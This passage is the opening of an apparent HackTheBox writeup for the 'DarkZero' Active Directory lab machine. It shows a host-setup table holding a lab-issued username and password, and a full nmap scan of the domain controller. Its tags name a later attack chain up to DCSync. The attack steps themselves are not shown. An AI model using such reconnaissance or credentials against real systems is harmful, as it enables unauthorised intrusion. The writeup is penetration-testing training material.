---
render_with_liquid: false
title: HackTheBox Writeup - DarkZero
date: 2025-10-06 18:38:20 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, impacket, bloodhound-ce, bloodhound-cli, ldeep, ad-trusts, mssql, mssqlclient, mssql-links, mssql-xp-cmdshell, cvedetails, kernel-exploit, cve-2024-30088, mimikatz, netexec, nltest, rubeus, coerce-authentication, mssql-xp-dirtree, ad-delegation, dcsync, evil-winrm]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9ff4ba31-6429-4ec3-bab5-6e77f0824285.png
    width: 640
    height: 480
---




# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ pt init '10.10.11.89 DC01.darkzero.htb darkzero.htb DC01'
+----------+--------+-------------+-------------------+
| PROFILE  | STATUS |     IP      |      DOMAIN       |
+----------+--------+-------------+-------------------+
| darkzero | on     | 10.10.11.89 | DC01.darkzero.htb |
| darkzero | on     | 10.10.11.89 | darkzero.htb      |
| darkzero | on     | 10.10.11.89 | DC01              |
+----------+--------+-------------+-------------------+

╒═══════════╤═════════════╤═══════════════════╤══════════════╤═════════════╤═══════════╤═══════════════════╤════════╤══════════════╕
│ profile   │ lhost       │ rhost             │ domain       │ ip          │ dc_name   │ dc_fqdn           │ user   │ pass         │
╞═══════════╪═════════════╪═══════════════════╪══════════════╪═════════════╪═══════════╪═══════════════════╪════════╪══════════════╡
│ darkzero  │ 10.10.14.72 │ DC01.darkzero.htb │ darkzero.htb │ 10.10.11.89 │ DC01      │ DC01.darkzero.htb │ john.w │ RFulUtONCOL! │
╘═══════════╧═════════════╧═══════════════════╧══════════════╧═════════════╧═══════════╧═══════════════════╧════════╧══════════════╛
```


## Nmap

```bash
# Nmap 7.95 scan initiated Mon Oct  6 18:38:20 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,1433,2179,3268,3269,5985,9389,49664,49666,49670,49671,49891,49921,49970,54830, 10.129.235.224
Nmap scan report for 10.129.235.224
Host is up, received user-set (0.19s latency).
Scanned at 2025-10-06 18:38:20 CST for 138s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-06 17:39:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-06T17:41:34+00:00; +7h00m56s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.235.224:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.235.224:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-06T09:23:15
| Not valid after:  2055-10-06T09:23:15
| MD5:   d7a1:13bf:f01b:8703:994e:58a9:6a5e:d81c
| SHA-1: fe38:b09b:5e37:8b2a:54e6:436c:e854:f1d0:fc10:17a7
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQVLR8Bzjj2YNF58f3vdyKXTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMDA2MDkyMzE1WhgPMjA1NTEwMDYwOTIzMTVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAPLf9WoI
| vmZseUCStRJdPauj9+FcgheSdlmXumd0StxrrbVjVSnSWbZpjPhWdM2n3ToxhMqV
| x7ecEGJ9QReSEMmWuz6TH90f6QNGHpYE1BPluF02D/zeOHtTzvwm4W2W4EaV11XM
| tLojgp7EZXGMOftH3TB+Px+GCVL2R8xIOJgDViMX4qellU+2r8W2iYXnbWUDJZmg
| sDUCiUVfnMqfytewcM/wi9v6WwYc+aAUjvLf1a4jR4GN56s5AJ/7Y9VupmoKbdeQ
| qADWSy85syvR0+RhAZMaMoERe4ReiVeS78q7HNMUmN2WUxR6mV46W+34MWeKvBsI
| SC1rUt3bWh0B87FCoVZTmJWDyvZAxTwgRbJQozQGPH8MkWCNNENqbNxyzvxR7IRM
| IyPLSlKXfQLjNLMzD3UlLMSQxsHriFlJtx8v6MFVFtKaE3UChAHA1J6pLwwTz9VB
| 81SC+7HOMgJN0kFhZdcSKC9l+HhkniywpuSUihOmJ2bWiRhxJ3L6NQyewQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQB3ja8Zm77hLeU+ckwJ6+x3IS0EnXdSJNr6M7nW
| KbO95C+71vn0rIk6dwJC3BD8gRxG0cZBQmJiMaP1NA/7ZGRN5yBGld0UKrDapTBi
| qKtc2xrNgAnaFsKNj1wmPxAju6PqSdES74q8FJo8bGOPL0IOQPy9PDUyNjlvkGBm
| kWVmTj61hUVemKq/QE6LOO5WA8FncUSBwds1F5dQvqWDXdgzaW+p7FNko0NOqGU+
| j8hEKDOpiP5KLUsCBR02XJ5ocR6TNW7c7CPsdhfh2lDXkQUy5BavKNQZU3V9PwYO
| hHPGwl+9W1FVjybfUSBMg91c8vTTrO/dAYcHjAQ4CqEYCwmt7mCd3KbgUtPKYFLY
| TgO5t8TtpcUnyI0KSrDdNWgF93tIuwhbjaZEcNfIlqKjwZoh7MO9rg7j4NgEc+26
| 9e3cGlCExqM4rJPkaAyTs3gGl51j7FazTPYY/kj5rtz9aru/mwt7SNOjx94yjie+
| 3y44j6HXP35UkJQFBrtHo2fJ2t0=
|_-----END CERTIFICATE-----
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwHhcNMjUwNzI5MTE0MDAwWhcN
| MjYwNzI5MTE0MDAwWjAcMRowGAYDVQQDExFEQzAxLmRhcmt6ZXJvLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALtgbmGxyLJnTefHNna7EjMScNUA
| n0C+Q4T4jkD9YjX+wpNOXHgmnrqpo8wYV0gQAGK9bnTYC8RJb7vWSZrI3MP+/dHw
| nB6AuOXvz6ahChE6C6wlnxMjD9NeJtwzq/RSpHjBFRc+sfGPbX32Y2CEjqzJISHR
| yOnbnuldHK3I4UNKVN28miXaB/dqrK3/Z6rFOuPWbnEqMuYV4LQh4tvxYb5QALUA
| jTwITLAp1prBoUQkdF5UAcpc/oIuP6VKYpjvv+m/yMuvaDIS+QtjRkP+4+ES0Tk3
| gZ489D4lkgndvw6Oz7MwZtpTXwAvmEWb6L0Pg+M0Vd5UjnkxNUiUsAGKgAECAwEA
| AaOCA0IwggM+MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdABy
| AG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0P
| AQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqG
| SIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQB
| AjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFDd9
| RV4kuWN9NU3bdgWvT4UqaXTjMB8GA1UdIwQYMBaAFGapgxh49WSDZkbTTZ9eZ8L7
| ypx7MIHMBgNVHR8EgcQwgcEwgb6ggbuggbiGgbVsZGFwOi8vL0NOPWRhcmt6ZXJv
| LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHDBggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUH
| MAKGgaNsZGFwOi8vL0NOPWRhcmt6ZXJvLURDMDEtQ0EsQ049QUlBLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9ZGFya3plcm8sREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
| cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD0GA1UdEQQ2MDSgHwYJKwYBBAGCNxkB
| oBIEEOfsqvw66j9ItSxN2uPjJRqCEURDMDEuZGFya3plcm8uaHRiME4GCSsGAQQB
| gjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS0xMTUyMTc5OTM1LTU4
| OTEwODE4MC0xOTg5ODkyNDYzLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAL28m69f
| CO5DYoe/9OPZ5i7haHUhbbyZSv0LRnJawwCP+YLaA6VWpmqBrqAVZ4lvP74KqRSs
| oEkwwX7C8lYEvSA+C97NcpoBzeH9aWCEWC/EaEz3sEL/QKcG7beM04HpP5qIzurP
| gqFJXBwmJSTvNPD53pN7edGlvC0tFgvuqXP/7L2xDnsxHeAA98RUl8NW8rwAlijj
| Car4Q0gryC682mAISxsHlv3Xp5ID5Ny8XkpIY9/qtVCtBXXDMd4XNzt1lGedHDWs
| 1OaZuQvWJMQjKrdFQ59m/bzpLggMlCF7a2TgMJ4wISuJeVXhyd2WXXBQfMigjQVl
| IfR+jf2n43K7ZJOjpZizW4sInL6efS9KW7A6XE7Tzx+ZLdko4sj444mwbXnLgTgQ
| a9N04FJMp6TKLSRO/Vk0AGD9cpLOwINLM2jgPaepAvfThifKGDX2gA4vfFCEVPp1
| /fLrQDjWwZfKBKchZQZ6RZzj1dfnZDIKhV9JT3Kfy1iIFTl2I8YDSmzumXdS4VgY
| pcDf6d2i1duAjNoNvg2pZj7gPzrhzim2g0ezy1Ipcu1AfeJBZ+zlsxpnZ1vPMnQ6
| j2Pwkxplofr8WFcyMBh1lXce8PrTm8+n70sA3D4InyfEhyydgzKsQTmeNbfQCOSY
| TwaWbho49qkLrdLNpB0KN4kHVKKweu3cvvcF
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
